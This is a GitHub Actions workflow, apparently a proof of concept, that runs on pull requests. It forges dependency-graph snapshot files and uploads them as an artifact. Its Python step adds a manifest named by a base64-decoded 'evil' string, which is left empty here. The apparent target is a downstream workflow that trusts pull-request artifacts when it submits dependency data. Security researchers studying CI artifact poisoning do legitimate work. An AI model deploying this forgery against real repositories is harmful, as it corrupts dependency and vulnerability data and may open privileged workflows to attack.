name: PR Workflow
on: pull_request
permissions:
  contents: read
jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: craft forged dependency graph
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          PR_NUM: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p dependency-graph-reports
          python3 - <<'PY'
          import json, os, base64, time
          base = os.environ["BASE_SHA"]
          head = os.environ["HEAD_SHA"]
          n = os.environ["PR_NUM"]
          evil = base64.b64decode("").decode()
          ts = str(int(time.time()))
          def man(loc, purls):
              return {"name": loc, "file": {"source_location": loc},
                      "resolved": {p: {"package_url": p, "relationship": "direct",
                                      "scope": "runtime", "dependencies": []} for p in purls}}
          def snap(sha, ref, mans, corr):
              return {"version": 0, "sha": sha, "ref": ref,
                      "job": {"correlator": corr, "id": corr},
                      "detector": {"name": corr, "version": "1.0.0", "url": "https://example.com"},
                      "scanned": "2026-10-30T00:00:00Z", "manifests": mans}
          bm = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"])}
          hm = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"]),
                evil: man(evil, ["pkg:maven/com.example/zzz@1.0.0"])}
          json.dump(snap(base, "refs/heads/poc-base", bm, "gab" + ts + "b"),
                    open("dependency-graph-reports/base.json", "w"))
          json.dump(snap(head, "refs/pull/%s/head" % n, hm, "gab" + ts + "h"),
                    open("dependency-graph-reports/head.json", "w"))
          print("evil_len", len(evil))
          PY
          echo keep > keep.txt
      - uses: actions/upload-artifact@v4
        with:
          name: dependency-graph_poc.json
          path: |
            dependency-graph-reports/
            keep.txt
